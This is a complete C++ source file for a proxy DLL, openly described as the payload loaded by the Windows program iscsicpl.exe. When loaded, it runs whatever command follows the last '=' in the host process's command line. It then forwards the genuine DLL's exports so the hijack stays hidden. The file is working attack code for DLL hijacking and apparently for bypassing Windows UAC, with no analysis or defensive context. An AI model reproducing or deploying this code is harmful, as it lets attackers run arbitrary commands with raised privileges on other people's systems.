// iscsiexe.cpp, the payload DLL executed by iscsicpl.exe
#include "pch.h"
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include "resource.h"
#pragma pack(1)

// LoadString() for linker
#pragma comment(lib,"User32.lib")

#define MAX_ENV_SIZE 32767

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	char *commandline=NULL;
	char *p = NULL;
	char split[2] = { '=' };
	char *execute=NULL;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		commandline=GetCommandLineA();
		p = strtok(commandline, split);
		while (p != NULL) {
			execute = p;
			p = strtok(NULL, split);
		}
		WinExec(execute,SW_SHOW);
		ExitProcess(0);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// the proxy DLL mappings for the linker
#pragma comment(linker, "/export:SvchostPushServiceGlobals=iscsiexe_org.SvchostPushServiceGlobals")
#pragma comment(linker, "/export:ServiceMain=iscsiexe_org.ServiceMain")
#pragma comment(linker, "/export:DiscpEstablishServiceLinkage=iscsiexe_org.DiscpEstablishServiceLinkage")